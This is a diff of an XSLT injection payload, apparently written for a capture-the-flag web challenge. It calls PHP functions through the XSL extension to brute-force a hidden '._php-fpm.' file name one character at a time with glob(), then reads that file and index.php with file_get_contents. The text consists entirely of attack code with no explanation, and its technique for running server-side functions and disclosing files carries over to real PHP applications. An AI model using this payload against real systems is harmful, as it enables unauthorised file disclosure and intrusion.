@@ -2,90 +2,90 @@
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
 xmlns:php="http://php.net/xsl"              
 >	
-<xsl:param  name="shandle"     select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.*')"/>
-<xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.a*')"/>
-<xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.b*')" />
-<xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.c*')" />
-<xsl:param  name="shandled"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.d*')" />
-<xsl:param  name="shandlee"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.e*')" />
-<xsl:param  name="shandlef"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.f*')" />
-<xsl:param  name="shandleg"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.g*')"/>
-<xsl:param  name="shandleh"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.h*')" />
-<xsl:param  name="shandlei"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.i*')" />
-<xsl:param  name="shandlej"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.j*')"/>
-<xsl:param  name="shandlek"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.k*')" />
-<xsl:param  name="shandlel"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.l*')" />
-<xsl:param  name="shandlem"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.m*')" />
-<xsl:param  name="shandlen"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.n*')" />
-<xsl:param  name="shandleo"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.o*')" />
-<xsl:param  name="shandlep"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p*')" />
-<xsl:param  name="shandleq"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.q*')" />
-<xsl:param  name="shandler"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.r*')" />
-<xsl:param  name="shandles"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.s*')"/>
-<xsl:param  name="shandlet"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.t*')" />
-<xsl:param  name="shandleu"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.u*')" />
-<xsl:param  name="shandlev"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.v*')" />
-<xsl:param  name="shandlew"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.w*')" />
-<xsl:param  name="shandlex"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.x*')" />
-<xsl:param  name="shandley"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.y*')" />
-<xsl:param  name="shandlez"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.z*')" />
-<xsl:param  name="shandleBa"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.A*')"/>
-<xsl:param  name="shandleBb"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.B*')" />
-<xsl:param  name="shandleBc"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.C*')" />
-<xsl:param  name="shandleBd"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.D*')" />
-<xsl:param  name="shandleBe"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.E*')" />
-<xsl:param  name="shandleBf"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.F*')" />
-<xsl:param  name="shandleBg"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.G*')"/>
-<xsl:param  name="shandleBh"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.H*')" />
-<xsl:param  name="shandleBi"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.I*')" />
-<xsl:param  name="shandleBj"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.J*')"/>
-<xsl:param  name="shandleBk"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.K*')" />
-<xsl:param  name="shandleBl"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.L*')" />
-<xsl:param  name="shandleBm"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.M*')" />
-<xsl:param  name="shandleBn"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.N*')" />
-<xsl:param  name="shandleBo"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.O*')" />
-<xsl:param  name="shandleBp"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.P*')" />
-<xsl:param  name="shandleBq"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.Q*')" />
-<xsl:param  name="shandleBr"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.R*')" />
-<xsl:param  name="shandleBs"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.S*')"/>
-<xsl:param  name="shandleBt"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.T*')" />
-<xsl:param  name="shandleBu"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.U*')" />
-<xsl:param  name="shandleBv"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.V*')" />
-<xsl:param  name="shandleBw"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.W*')" />
-<xsl:param  name="shandleBx"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.X*')" />
-<xsl:param  name="shandleBy"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.Y*')" />
-<xsl:param  name="shandleBz"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.Z*')" />
-<xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm._*')" />
-<xsl:param  name="shandle0"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.0*')" />
-<xsl:param  name="shandle1"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.1*')" />
-<xsl:param  name="shandle2"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.2*')" />
-<xsl:param  name="shandle3"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.3*')" />
-<xsl:param  name="shandle4"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.4*')" />
-<xsl:param  name="shandle5"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.5*')" />
-<xsl:param  name="shandle6"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.6*')" />
-<xsl:param  name="shandle7"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.7*')" />
-<xsl:param  name="shandle8"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.8*')" />
-<xsl:param  name="shandle9"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.9*')" />
-<xsl:param  name="shandle10"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.~*')" />
-<xsl:param  name="shandle11"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.!*')" />
-<xsl:param  name="shandle12"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.@*')" />
-<xsl:param  name="shandle13"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.#*')" />
-<xsl:param  name="shandle14"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.$*')" />
-<xsl:param  name="shandle15"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.%*')" />
-<xsl:param  name="shandle16"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.(*')" />
-<xsl:param  name="shandle17"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.)*')" />
-<xsl:param  name="shandle18"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.-*')" />
-<xsl:param  name="shandle19"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.+*')" />
-<xsl:param  name="shandle20"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.{*')" />
-<xsl:param  name="shandle21"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.}*')" />
-<xsl:param  name="shandle22"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.[*')" />
-<xsl:param  name="shandle23"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.]*')" />
-<xsl:param  name="shandle24"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.|*')" />
+<xsl:param  name="shandle"     select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p*')"/>
+<xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pa*')"/>
+<xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pb*')" />
+<xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pc*')" />
+<xsl:param  name="shandled"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pd*')" />
+<xsl:param  name="shandlee"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pe*')" />
+<xsl:param  name="shandlef"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pf*')" />
+<xsl:param  name="shandleg"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pg*')"/>
+<xsl:param  name="shandleh"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.ph*')" />
+<xsl:param  name="shandlei"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pi*')" />
+<xsl:param  name="shandlej"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pj*')"/>
+<xsl:param  name="shandlek"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pk*')" />
+<xsl:param  name="shandlel"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pl*')" />
+<xsl:param  name="shandlem"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pm*')" />
+<xsl:param  name="shandlen"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pn*')" />
+<xsl:param  name="shandleo"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.po*')" />
+<xsl:param  name="shandlep"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pp*')" />
+<xsl:param  name="shandleq"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pq*')" />
+<xsl:param  name="shandler"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pr*')" />
+<xsl:param  name="shandles"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.ps*')"/>
+<xsl:param  name="shandlet"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pt*')" />
+<xsl:param  name="shandleu"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pu*')" />
+<xsl:param  name="shandlev"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pv*')" />
+<xsl:param  name="shandlew"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pw*')" />
+<xsl:param  name="shandlex"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.px*')" />
+<xsl:param  name="shandley"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.py*')" />
+<xsl:param  name="shandlez"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pz*')" />
+<xsl:param  name="shandleBa"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pA*')"/>
+<xsl:param  name="shandleBb"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pB*')" />
+<xsl:param  name="shandleBc"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pC*')" />
+<xsl:param  name="shandleBd"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pD*')" />
+<xsl:param  name="shandleBe"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pE*')" />
+<xsl:param  name="shandleBf"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pF*')" />
+<xsl:param  name="shandleBg"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pG*')"/>
+<xsl:param  name="shandleBh"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pH*')" />
+<xsl:param  name="shandleBi"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pI*')" />
+<xsl:param  name="shandleBj"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pJ*')"/>
+<xsl:param  name="shandleBk"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pK*')" />
+<xsl:param  name="shandleBl"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pL*')" />
+<xsl:param  name="shandleBm"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pM*')" />
+<xsl:param  name="shandleBn"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pN*')" />
+<xsl:param  name="shandleBo"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pO*')" />
+<xsl:param  name="shandleBp"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pP*')" />
+<xsl:param  name="shandleBq"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pQ*')" />
+<xsl:param  name="shandleBr"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pR*')" />
+<xsl:param  name="shandleBs"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pS*')"/>
+<xsl:param  name="shandleBt"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pT*')" />
+<xsl:param  name="shandleBu"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pU*')" />
+<xsl:param  name="shandleBv"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pV*')" />
+<xsl:param  name="shandleBw"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pW*')" />
+<xsl:param  name="shandleBx"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pX*')" />
+<xsl:param  name="shandleBy"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pY*')" />
+<xsl:param  name="shandleBz"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.pZ*')" />
+<xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p_*')" />
+<xsl:param  name="shandle0"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p0*')" />
+<xsl:param  name="shandle1"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p1*')" />
+<xsl:param  name="shandle2"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p2*')" />
+<xsl:param  name="shandle3"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p3*')" />
+<xsl:param  name="shandle4"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p4*')" />
+<xsl:param  name="shandle5"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p5*')" />
+<xsl:param  name="shandle6"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p6*')" />
+<xsl:param  name="shandle7"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p7*')" />
+<xsl:param  name="shandle8"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p8*')" />
+<xsl:param  name="shandle9"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p9*')" />
+<xsl:param  name="shandle10"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p~*')" />
+<xsl:param  name="shandle11"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p!*')" />
+<xsl:param  name="shandle12"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p@*')" />
+<xsl:param  name="shandle13"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p#*')" />
+<xsl:param  name="shandle14"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p$*')" />
+<xsl:param  name="shandle15"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p%*')" />
+<xsl:param  name="shandle16"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p(*')" />
+<xsl:param  name="shandle17"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p)*')" />
+<xsl:param  name="shandle18"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p-*')" />
+<xsl:param  name="shandle19"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p+*')" />
+<xsl:param  name="shandle20"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p{*')" />
+<xsl:param  name="shandle21"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p}*')" />
+<xsl:param  name="shandle22"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p[*')" />
+<xsl:param  name="shandle23"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p]*')" />
+<xsl:param  name="shandle24"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p|*')" />
 
-<xsl:param  name="shandle27"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm..*')" />
-<xsl:param  name="shandle28"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.;*')" />
-<xsl:param  name="shandle29"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.:*')" />
-<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/._php-fpm.')" /> 
+<xsl:param  name="shandle27"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p.*')" />
+<xsl:param  name="shandle28"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p;*')" />
+<xsl:param  name="shandle29"    select="php:function('glob','/challenge/web-serveur/ch50/._php-fpm.p:*')" />
+<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/._php-fpm.p')" /> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" />
 <xsl:template match="/">	
   ._php*:<xsl:value-of select="$shandle"/>
